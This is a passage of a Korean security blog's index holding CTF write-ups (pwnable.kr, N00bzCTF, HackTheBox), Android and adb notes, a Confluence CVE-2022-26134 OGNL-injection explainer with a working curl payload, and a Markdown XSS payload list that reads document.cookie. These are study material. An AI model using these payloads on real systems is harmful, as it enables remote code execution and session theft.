","date":"2022-10-22T10:02:39+09:00","image":"https://appealso.github.io/p/pwnable.kr-bof/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-bof/","title":"pwnable.kr bof"},{"content":"해당 문제를 실행하면 오류가 발생한다. 파일이 패키징되어 있다고 추측이 되었고, 이를 확인하기 위해 아래와같은 명령어를 사용하여 확인하여 upx 패킹이 되어있는 것을 확인 할 수 있었다.\n(base) ✘ KIM 🔥  ~/Downloads  strings ./flag| grep packed $Info: This file is packed with the UPX executable packer http://upx.sf.net $ upx 언패킹을 하기위해 아래와같이 실행하여 언패킹을 해주었다.\n(base) KIM 🔥  ~/Downloads  upx -d flag Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 \u0026lt;- 335288 37.94% linux/amd64 flag Unpacked 1 file. 아래 코드를 분석해보면 0x6c2070 에 플래그가 들어있는 것을 확인 할 수 있었고, x/1s *0x6c2070를 입력하여 답을 얻을 수 있었다.\npwndbg\u0026gt; disassemble main Dump of assembler code for function main: 0x0000000000401164 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000401165 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000000000401168 \u0026lt;+4\u0026gt;:\tsub rsp,0x10 0x000000000040116c \u0026lt;+8\u0026gt;:\tmov edi,0x496658 0x0000000000401171 \u0026lt;+13\u0026gt;:\tcall 0x402080 \u0026lt;puts\u0026gt; 0x0000000000401176 \u0026lt;+18\u0026gt;:\tmov edi,0x64 0x000000000040117b \u0026lt;+23\u0026gt;:\tcall 0x4099d0 \u0026lt;malloc\u0026gt; 0x0000000000401180 \u0026lt;+28\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x0000000000401184 \u0026lt;+32\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 \u0026lt;flag\u0026gt;  0x000000000040118b \u0026lt;+39\u0026gt;:\tmov rax,QWORD PTR [rbp-0x8] 0x000000000040118f \u0026lt;+43\u0026gt;:\tmov rsi,rdx 0x0000000000401192 \u0026lt;+46\u0026gt;:\tmov rdi,rax 0x0000000000401195 \u0026lt;+49\u0026gt;:\tcall 0x400320 0x000000000040119a \u0026lt;+54\u0026gt;:\tmov eax,0x0 0x000000000040119f \u0026lt;+59\u0026gt;:\tleave 0x00000000004011a0 \u0026lt;+60\u0026gt;:\tret End of assembler dump. pwndbg\u0026gt; x/1s *0x6c2070 0x496628:\t\u0026#34;UPX...? sounds like a delivery service :)\u0026#34; pwndbg\u0026gt; ","date":"2022-10-22T10:02:39+09:00","image":"https://appealso.github.io/p/pwnable.kr-flag/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-flag/","title":"pwnable.kr flag"},{"content":"해당 문제를 실행하면 아래와 같은 코드가 주어진다.\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u0026lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u0026lt;2){ printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); return 0; } if(hashcode == check_password( argv[1] )){ system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } else printf(\u0026#34;wrong passcode.\\n\u0026#34;); return 0; } 위에 코드를 해석해보면 20byte가 입력되어야하고, hashcode에 대입된 0x21DD09EC와 비교하여 플래그를 출력하는 것을 볼 수 있다. 0x21DD09EC만 입력할 경우 20byte가 되지 않기 때문에 이를 4로 나누어준 뒤 나머지를 더하는 방식으로 답을 도출할 수 있었다.\n 0x21DD09EC = \\xC8\\xCE\\xC5\\x06\u0026quot;*4+\u0026quot;\\xcc\\xce\\xc5\\x06 \u0026lt;\u0026ndash; 리틀엔디언 방식으로 쓰여있어서 이렇게 표현  col@pwnable:~$ ./col `python -c \u0026#39;print \u0026#34;\\xC8\\xCE\\xC5\\x06\u0026#34;*4+\u0026#34;\\xcc\\xce\\xc5\\x06\u0026#34;\u0026#39;` daddy! I just managed to create a hash collision :) ","date":"2022-10-22T09:59:50+09:00","image":"https://appealso.github.io/p/pwnable.kr-collision/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-collision/","title":"pwnable.kr collision"},{"content":"해당 문제를 실행하면 아래와 같은 코드가 주어진다.\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } 코드를 해석해보면 0x1234와 비교한 뒤 LETMEWIN을 입력하면 플레그를 출력하는것을 볼수 있다. 0x1234는 10진수로 4660이기 때문에 아래와 같이 입력하여 답을 얻을 수 있었다.\nfd@pwnable:~$ ./fd 4660 LETMEWIN good job :) mommy! I think I know what a file descriptor is!! ","date":"2022-10-22T09:54:30+09:00","image":"https://appealso.github.io/p/pwnable.kr-fd/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-fd/","title":"pwnable.kr fd"},{"content":"안드로이드 4대요소 Activity  사용자와 상호작용하기 위한 진입점, 사용자 인터페이스를 포함한 화면 하나를 나타냄  \u0026lt;manifest ... \u0026gt; \u0026lt;application ... \u0026gt; \u0026lt;activity android:name=\u0026#34;com.example.myapp.MainActivity\u0026#34; ... \u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;/application\u0026gt; \u0026lt;/manifest\u0026gt; Service  백그라운드에서 앱을 계속 실행하기 위한 다목적 진입점  \u0026lt;manifest ... \u0026gt; ... \u0026lt;application ... \u0026gt; \u0026lt;service android:name=\u0026#34;.ExampleService\u0026#34; /\u0026gt; ... \u0026lt;/application\u0026gt; \u0026lt;/manifest\u0026gt; BroadCast Receiver  시스템이 정기적인 사용자 플로우 밖에서 이벤트를 앱에 전달하도록 지원하는 컴포넌트  \u0026lt;receiver android:name=\u0026#34;.MyBroadcastReceiver\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.BOOT_COMPLETED\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.INPUT_METHOD_CHANGED\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; Contents Provider  콘텐츠 제공자는 파일 시스템, SQLite 데이터 베이스, 웹상이나 앱이 접근할 수 있는 다른 모든 영구 저장소에 저장 간으한 앱 데이터의 공유형 집합을 관리함  \u0026lt;provider android:name=\u0026#34;.TrackUserContentProvider\u0026#34; android:authorities=\u0026#34;com.android.insecurebankv2.TrackUserContentProvider\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;/provider\u0026gt; 애플리케이션의 권한 관리 (UID 할당)  안드로이드는 리눅스 커널을 기반으로 구축 됨 안드로이드에 설치된 모든 애플리케이션은 일반 사용자 권한으로 실행됨 접근 시 사용자의 동의를 받도록 하고 있음  스위치   안드로이드 디렉토리 구조    디렉토리 설명     /system/app 시스템에의해미리설치된앱경로   /data/app 사용자에의해설치된앱경로   /data/data/\u0026lt;package\u0026gt; 설치앱패키지경로,루트권한으로접근가능   /data/data/\u0026lt;package\u0026gt;/files 애플리케이션이 소유한 데이터 또는 파일 저장 (so파일, data파일, ini 파일 등이 포함됨)   /data/data/\u0026lt;package\u0026gt;/lib 애플리케이션에 요청하는 라이브러리 파일 저장 (so 파일이 존재함)   /data/data/\u0026lt;package\u0026gt;/databases 설정 파일, 컨텐츠 파일 등의 쿼리 정보가 포함된 SQLlite 데이터베이스 파일 (db 파일이 존재함)   /data/data/\u0026lt;package\u0026gt;/cache 브라우저 캐시같이 일시적인 사용자의 상태정보가 포함   /data/data/\u0026lt;package\u0026gt;/shared_prefs XML파일로저장이되며,앱에공유되는설정파일   /mnt/sdcard or /sdcard External/Internal SD Card 경로   /system/app/앱이름.apk 시스템앱공간 세이프모드로 부팅이 될 시에는 시스템 앱들이 가능한 앱들이 실행   /data/app/앱이름.apk 사용자가 다운로드한 앱들의 공간   /data/davik-cache dex 파일이 보관    adb 명령어    옵션 설명     adb \u0026ndash;help adb 명령어 도움말 확인   adb connect \u0026lt;device_ip_address\u0026gt; 아이피 주소로 디바이스에 연결   adb devices 연결되어 있는 디바이스 목록 출력   adb kill-server 서버가 실행 중인 경우 종료   adb start-server 서버가 종료된 경우 실행   adb shell adb를 통해 양방향 셸 실행   adb –s \u0026lt;SERIAL\u0026gt; 지정된 SERIAL 대상 디바이스에 명령어 전송   adb install \u0026lt;path_to_apk\u0026gt; APK 파일을 지정하여 설치   adb uninstall \u0026lt;PACKAGE\u0026gt; 디바이스에서 앱 패키지 제거   adb pull \u0026lt;remote\u0026gt; \u0026lt;local\u0026gt; 디바이스에서 로컬 컴퓨터로 파일 및 디렉터리를 복사   adb push \u0026lt;local\u0026gt; \u0026lt;remote\u0026gt; 로컬 컴퓨터에서 디바이스로 파일 및 디렉터리를 복사   adb logcat 디바이스 로그 모니터링     떠있는 패키지 확인 방법  adb shell dumpsys window windows | grep -E \u0026lsquo;mCurrentFocus|mFocusedApp\u0026rsquo;    안드로이드 shell command    옵션 설명     am \u0026lt;command\u0026gt; Activity Manager(활동 관리자) 호출   am start \u0026lt;intent\u0026gt; 인텐트에 지정된 Activity를 시작   am startservice \u0026lt;intent\u0026gt; 인텐트에 지정된 Service를 시작   am broadcast \u0026lt;intent\u0026gt; 브로드캐스트 인텐트를 실행   am dumpheap \u0026lt;process\u0026gt; \u0026lt;file\u0026gt; process의 힙을 덤프하고 file에 작성   pm \u0026lt;command\u0026gt; Package Manager(패키지 관리자) 호출   pm list packages 모든 패키지 목록 출력   pm path \u0026lt;package\u0026gt; 지정한 패키지의 APK 경로 출력   input text \u0026lt;string\u0026gt; 지정한 텍스트 입력   Input keyevent \u0026lt;key code number or name\u0026gt; 지정한 키 이벤트 입력     액티비티 실행 명령어  adb shell am start -n [package name/component name] 호출가능한 경우 아래와 같이 exported 속성이 true 여야함 \u0026lt;activity android:name=\u0026#34;com.android.ChangePassword\u0026#34; android:exported=\u0026#34;true\u0026#34; android:lable=\u0026#34;change_password\u0026#34;\u0026gt; \u0026lt;/activity\u0026gt;     intent 옵션    옵션 설명     -a action 인텐트 작업을 지정   -n component 패키지 이름을 접두사로 구성 요소 이름을 지정   -e | \u0026ndash;es extra_key extra_string_value 문자열 데이터를 키-값 쌍으로 추가   \u0026ndash;ez extra_key extra_boolean_value 불리언 데이터를 키-값 쌍으로 추가    ","date":"2022-07-20T20:33:30+09:00","permalink":"https://appealso.github.io/p/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC/","title":"안드로이드 기초 정리"},{"content":"개요 Confluence에서 원격 코드 취약점이 발견 되었습니다. Confluence Server 및 Data Center에서 OGNL 인젝션으로 인해 발생하는 원격코드실행 취약점(CVE-2022-26134)으로 SaaS서비스가 아닌 자체 구축버전에서 발견된 것으로 파악됩니다.\n영향 받는 버전  Confluence Server and Data Center\t1.3.0 이후 모든 버전  패치된 버전 Confluence Server 7.4.17 Confluence Server 7.13.7 Confluence Server 7.14.3 Confluence Server 7.15.2 Confluence Server 7.16.4 Confluence Server 7.17.4 Confluence Server 7.18.1\n발생원리 OGNL Injection이란? OGNL(Object Graph Navigation Language)은 Java용 오픈 소스 EL(Expression Language)로, Java 언어에서 지원하는 전체 범위보다 간단한 표현식을 사용하면서 정의된 setProperty 및 getProperty를 통해 속성을 가져오고 설정할 수 있습니다.\nOGNL 예시 \u0026lt;%@page contentType=\u0026quot;text/html;charset=utf-8\u0026quot;%\u0026gt; \u0026lt;%@page import=\u0026quot;ognl.Ognl\u0026quot;%\u0026gt; \u0026lt;%@page import=\u0026quot;ognl.OgnlContext\u0026quot;%\u0026gt; \u0026lt;% String param=request.getParameter(\u0026quot;param\u0026quot;); OgnlContext ctf = new OgnlContext(); Object value = Ognl.getValue(param,ctx,\u0026quot;\u0026quot;); %\u0026gt; 입력 값: \u0026lt;%=value%\u0026gt; 위에 코드를 보면 param이라는 변수에 저장된 명령어를 value에 저장하여 실행하는 것을 볼 수 있습니다. 취약점은 여기서 param 변수에서 발생합니다. 변수에 아무런 검증 없이 값이 들어올 수 있어 시스템 명령어가 실행되는 원리입니다. 예를 들어 공격하는 입장이라면 아래와 같은 URL을 만들어 호출하고 공격을 할 수 있을 것입니다.\n공격 예시 http://attack.url/test.jsp?param=%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D \u0026gt;\u0026gt; Deconde: http://attack.url/test.jsp?param=${@java.lang.Runtime@getRuntime().exec(\u0026quot;touch /tmp/r7\u0026quot;)} Confluence 원격 코드 취약점 (CVE-2022-26134) Confluence 원격 코드 취약점도 위에서 설명한 OGNL Injection을 활용한 취약점 입니다. OGNL 페이로드는 HTTP 요청의 URI에 배치됩니다. 가장 간단한 형태는 아래와 같습니다.\ncurl -v http://attack.url/%24%7b%28%23%61%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%22%75%74%66%2d%38%22%29%29%2e%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%77%65%62%77%6f%72%6b%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%73%65%74%48%65%61%64%65%72%28%22%58%2d%43%6d%64%2d%52%65%73%70%6f%6e%73%65%22%2c%23%61%29%29%7d \u0026gt;\u0026gt; decode: curl -v http://attack.url/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026quot;id\u0026quot;).getInputStream(),\u0026quot;utf-8\u0026quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\u0026quot;X-Cmd-Response\u0026quot;,#a))} 참고 https://krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=66752\u0026queryString=cGFnZT0xJnNvcnRfY29kZT0mc29ydF9jb2RlX25hbWU9JnNlYXJjaF9zb3J0PXRpdGxlX25hbWUmc2VhcmNoX3dvcmQ9Y29uZmx1ZQ==\nhttps://m.blog.naver.com/PostView.naver?isHttpsRedirect=true\u0026blogId=skinfosec2000\u0026logNo=220954123887\nhttps://blog.alyac.co.kr/4772\n","date":"2022-07-04T22:22:46+09:00","image":"https://appealso.github.io/p/confluence-%EC%9B%90%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%ACcve-2022-26134/cover_hu1005bdd5c596c9079be58a4576d39e30_5440_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/confluence-%EC%9B%90%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%ACcve-2022-26134/","title":"Confluence 원격 코드 취약점 정리(CVE-2022-26134)"},{"content":"최근 Markdown편집기에서 XSS 공격이 가능한 것을 알게되어 정리합니다.\nMarkdown이란? Markdown은 콘텐츠를 작성하고 형식을 지정하기 위한 간단한 언어입니다. GitHub의 Gists 및 readme 파일 등에서 사용됩니다.\nMarkdown 이미지 등록 예시  춘식 \nMarkdown 파일에서 아래와 같은 Markdown 코드를 작성하면 위에 이미지가 나오는 것을 확인 할 수있습니다.\n![춘식](markdown.jpeg) 여기서 알 수 있는 것은 Markdown 문법으로 작성하면 이를 HTML로 변환 해준다는 것을 알 수있습니다. 위에 Markdown코드의 경우 아래의 html로 바뀔 것 입니다.\n\u0026lt;img src=\u0026#34;./markdown.jpeg\u0026#34; alt=\u0026#34;춘식\u0026#34;\u0026gt; 이를 활용하면 XSS Exploit이 가능합니다. 아래의 EX01의 markdown을 작성하면 EX01의 HTML로 변환되면서 공격이 가능할 것을 확인할 수 있습니다.\n EX01 - Markdown  ![XSS](\u0026#34;onerror=\u0026#34;alert(\u0026#39;XSS\u0026#39;))  EX01 - HTML  \u0026lt;img src=\u0026#34;\u0026#34; onerror=\u0026#34;alert(\u0026#39;XSS\u0026#39;)\u0026#34; alt=\u0026#34;xss\u0026#34;\u0026gt; Exploit Code [a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\ [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](\u0026amp;#x6A\u0026amp;#x61\u0026amp;#x76\u0026amp;#x61\u0026amp;#x73\u0026amp;#x63\u0026amp;#x72\u0026amp;#x69\u0026amp;#x70\u0026amp;#x74\u0026amp;#x3A\u0026amp;#x61\u0026amp;#x6C\u0026amp;#x65\u0026amp;#x72\u0026amp;#x74\u0026amp;#x28\u0026amp;#x27\u0026amp;#x58\u0026amp;#x53\u0026amp;#x53\u0026amp;#x27\u0026amp;#x29) ![a\u0026#39;\u0026#34;`onerror=prompt(document.cookie)](x)\\ [citelol]: (javascript:prompt(document.cookie)) [notmalicious](javascript:window.onerror=alert;throw%20document.cookie) [test](javascript://%0d%0aprompt(1)) [test](javascript://%0d%0aprompt(1);com) [notmalicious](javascript:window.onerror=alert;throw%20document.cookie) [notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie) [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](javascript:this;alert(1)) [a](javascript:this;alert(1\u0026amp;#41;) [a](javascript\u0026amp;#58this;alert(1\u0026amp;#41;) [a](Javas\u0026amp;#99;ript:alert(1\u0026amp;#41;) [a](Javas%26%2399;ript:alert(1\u0026amp;#41;) [a](javascript:alert\u0026amp;#65534;(1\u0026amp;#41;) [a](javascript:confirm(1) [a](javascript://www.google.com%0Aprompt(1)) [a](javascript://%0d%0aconfirm(1);com) [a](javascript:window.onerror=confirm;throw%201) [a](\u0001javascript:alert(document.domain\u0026amp;#41;) [a](javascript://www.google.com%0Aalert(1)) [a](\u0026#39;javascript:alert(\u0026#34;1\u0026#34;)\u0026#39;) [a](JaVaScRiPt:alert(1)) ![a](https://www.google.com/image.png\u0026#34;onload=\u0026#34;alert(1)) ![a](\u0026#34;onerror=\u0026#34;alert(1)) \u0026lt;/http://\u0026lt;?php\\\u0026gt;\u0026lt;\\h1\\\u0026gt;\u0026lt;script:script\u0026gt;confirm(2) [a](.alert(1);) [a](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]]) [a](http://a?p=[[/onclick=alert(0) .]]) [a](javascript:new%20Function`al\\ert\\`1\\``;) 참고 https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8\n","date":"2022-06-26T09:40:46+09:00","image":"https://appealso.github.io/p/markdown-xss/cover_hu161303a9df718806f0c2007593d7c416_48810_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/markdown-xss/","title":"Markdown XSS"},{"content":"[Crpyto] - RSA RSA암호화라는건 알고 잇었는데 RSA 암호화 알고리즘을 자세하게 공부한 것은 이번이 처음이라 기록을 남기려고 한다. 해당 문제를 열었을 떄 아래와 같은 python 코드가 주어진다.\n# ct = 68915718021581205938132340378 # n = 22964326243465188806208175092817347325223751455203934839482603060029805229708465878030254819573089332477084079330445929855173787412006349904864930449245982063200060526847746608051441362052994064461426109292644943462306467765210530381760387813568149905672759271878822092979239650360475796179311415340966347044401497301347973838444826544061998479163636946750265778097717211762208385963205388216125639236403616607313423716206061201112615302831337395011064188536794425701313580122604533837935452384701344503773605128479669035610395170026350607423780797383865621285538151344219282466601404674101508588637419153433890102137 # s = 6747770137526404810839680591618349902868945426501581276399132116507818856417271976886226143238796548185022079396435297411063351895882402872038955136430497260880818613647851713479263986391308789043197324119239260033630040630976512064481721240642729114116561261667588426398515959668695454587899042998666589705506998832917739337175589667828567571421541128057015371328723095841794613223799998429126797512729366352049800447550388154359724453576012916007310993864290045596969157854816882402679820492333445924724199994952395214639223249892224753494733720946542351810699104265693993026233289328344375145590992008664182919067 from Crypto.Util.number import * p = getPrime(1024) q = getPrime(1024) n = p*q e = 65537 flag = b\u0026#39;REDACTED\u0026#39; flag_int = bytes_to_long(flag)\tphi = (p-1)*(q-1) ct = pow(flag_int,e,n) #assert ct = 0xdeadbeefdeadbeefdeadbeef + 1337 + 1337 + 1337 d = inverse(e,phi) s = pow(flag_int,d,n) print(f\u0026#39;s = {s}\u0026#39;) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;ct = {ct}\u0026#39;) 위에 코드를 해석해 보면 RSA 암호화에 필요한 값들을 생성하고 암호화한 값 S를 만들어 출력한다. 복호화에 필요한 값들을 정리하여 아래와 같은 코드를 작성하여 Flag를 획득 할 수 있었다. (문제 푸는 사람들을 헷길리게 하기 위해 ct값이 주어진 것으로 보인다.) 참고: https://cryptobook.nakov.com/digital-signatures/rsa-signatures\ne = 65537 n = 22964326243465188806208175092817347325223751455203934839482603060029805229708465878030254819573089332477084079330445929855173787412006349904864930449245982063200060526847746608051441362052994064461426109292644943462306467765210530381760387813568149905672759271878822092979239650360475796179311415340966347044401497301347973838444826544061998479163636946750265778097717211762208385963205388216125639236403616607313423716206061201112615302831337395011064188536794425701313580122604533837935452384701344503773605128479669035610395170026350607423780797383865621285538151344219282466601404674101508588637419153433890102137 s = 6747770137526404810839680591618349902868945426501581276399132116507818856417271976886226143238796548185022079396435297411063351895882402872038955136430497260880818613647851713479263986391308789043197324119239260033630040630976512064481721240642729114116561261667588426398515959668695454587899042998666589705506998832917739337175589667828567571421541128057015371328723095841794613223799998429126797512729366352049800447550388154359724453576012916007310993864290045596969157854816882402679820492333445924724199994952395214639223249892224753494733720946542351810699104265693993026233289328344375145590992008664182919067 ans = pow(s,e,n) print(long_to_bytes(ans)) ","date":"2022-06-18T16:07:41+09:00","image":"https://appealso.github.io/p/n00bzctf-crpyto-rsa/cover_hu9a07790b52a43b6c840a3a8793df70ef_7677_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/n00bzctf-crpyto-rsa/","title":"N00bzCTF - [Crpyto] - RSA"},{"content":"[Revesing] - encryption_with_matrices Python 형태로 나오는 리버싱 문제는 처음 접해 기록을 남기려고 한다. 해당 문제를 열었는데 아래와 같은 python 코드가 주어진다.\nflag = \u0026#39;REDACTED\u0026#39; rand = \u0026#39;瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆瀆\u0026#39; def str_to_matrix(string): for i in range(2): letter = ord(string) flag_mat = [letter,letter] return flag_mat final_flag_matrix = [] for i in flag: final_flag_matrix.append(str_to_matrix(i)) leet_matrix = [] for i in rand: leet_matrix.append(str_to_matrix(i)) enc_flag_matrix = [] for i in final_flag_matrix: x = int(i[0]) * int(i[1]) enc_flag_matrix.append(x) enc_leet_matrix = [] for i in leet_matrix: y = int(i[0]) * int(i[1]) enc_leet_matrix.append(y) print(f\u0026#39;leet={enc_leet_matrix}\u0026#39;) print(\u0026#39;=\u0026#39;*80) final_ct = [] for i in range(len(enc_leet_matrix)): final_ct.append(enc_leet_matrix[i]*enc_flag_matrix[i]) print(f\u0026#39;ct={final_ct}\u0026#39;) #ct=[21629584900, 4118558976, 4118558976, 17167812676, 26606176996, 27044131401, 5407396225, 19334346304, 4291953169, 23640600025, 16132810225, 23640600025, 17519963769, 19334346304, 4649466969, 21238107289, 4649466969, 16132810225, 24053528464, 4118558976, 4118558976, 20465877481, 16132810225, 21238107289, 4649466969, 16132810225, 21238107289, 4118558976, 23231246724, 4649466969, 16132810225, 24053528464, 19334346304, 4833586576, 21629584900, 16132810225, 18597867876, 4291953169, 24890110756, 4649466969, 16132810225, 19334346304, 4118558976, 24470032041, 23231246724, 23640600025, 16132810225, 24053528464, 4118558976, 16132810225, 21238107289, 4833586576, 20465877481, 4649466969, 16132810225, 4833586576, 21629584900, 17875690000, 16132810225, 5021281321, 16132810225, 21238107289, 4291953169, 21629584900, 24470032041, 24053528464, 4649466969, 23640600025, 16132810225, 24053528464, 4118558976, 16132810225, 23640600025, 4118558976, 20850204816, 24890110756, 4649466969, 16132810225, 25740993600, 8265719056, 8265719056, 27930765625] 위에 코드를 해석해보면 아래와 같은 흐름이 나온다.\n flag, rand 의 값을 제곱 flag 제곱 값과 rand의 제곱 값을 곱하여 출력  rand에 입력된 값을 보면 특수문자가 반복되어 입력이 된 것을 확인할 수 있다. 여기서 추측 할 수 있는건 특수문자가 모두 동일하고, final_ct에 출력한 값의 최대 공약수를 구하면 특수문자의 값을 구할 수 있을 것으로 추측 했다. 최대 공약수를 계산해보면 1337^2이라는 것을 확인할 수 있었고, 아래와 같은 코드를 만들어 flag를 구할 수 있었다.\nct = [21629584900, 4118558976, 4118558976, 17167812676, 26606176996, 27044131401, 5407396225, 19334346304, 4291953169, 23640600025, 16132810225, 23640600025, 17519963769, 19334346304, 4649466969, 21238107289, 4649466969, 16132810225, 24053528464, 4118558976, 4118558976, 20465877481, 16132810225, 21238107289, 4649466969, 16132810225, 21238107289, 4118558976, 23231246724, 4649466969, 16132810225, 24053528464, 19334346304, 4833586576, 21629584900, 16132810225, 18597867876, 4291953169, 24890110756, 4649466969, 16132810225, 19334346304, 4118558976, 24470032041, 23231246724, 23640600025, 16132810225, 24053528464, 4118558976, 16132810225, 21238107289, 4833586576, 20465877481, 4649466969, 16132810225, 4833586576, 21629584900, 17875690000, 16132810225, 5021281321, 16132810225, 21238107289, 4291953169, 21629584900, 24470032041, 24053528464, 4649466969, 23640600025, 16132810225, 24053528464, 4118558976, 16132810225, 23640600025, 4118558976, 20850204816, 24890110756, 4649466969, 16132810225, 25740993600, 8265719056, 8265719056, 27930765625] tmp =\u0026#39;\u0026#39; for i in ct: tmp+=(chr(int((i/1787569)**(1/2)))) # 제곱근을 구하면된다! 1787569는 제곱근을 추측해서 구했다. print(tmp) ","date":"2022-06-18T16:07:25+09:00","image":"https://appealso.github.io/p/n00bzctf-reversing-encryption_with_matrices/cover_hu9a07790b52a43b6c840a3a8793df70ef_7677_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/n00bzctf-reversing-encryption_with_matrices/","title":"N00bzCTF [Reversing] - encryption_with_matrices"},{"content":"[Crypto] - Android-in-the-Middle 해당 문제는 소켓통신을 하는 Docker 서버와 서버를 동작시키는 코드가 주어졌다.\n서버 코드도 제공을 했는데 해당 코드를 다운로드 하여 열어보면 아래와 같았다.\nfrom Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random import socketserver import signal FLAG = \u0026#34;HTB{--REDACTED--}\u0026#34; DEBUG_MSG = \u0026#34;DEBUG MSG - \u0026#34; p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9 g = 2 class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def recieveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def decrypt(encrypted, shared_secret): key = hashlib.md5(long_to_bytes(shared_secret)).digest() cipher = AES.new(key, AES.MODE_ECB) message = 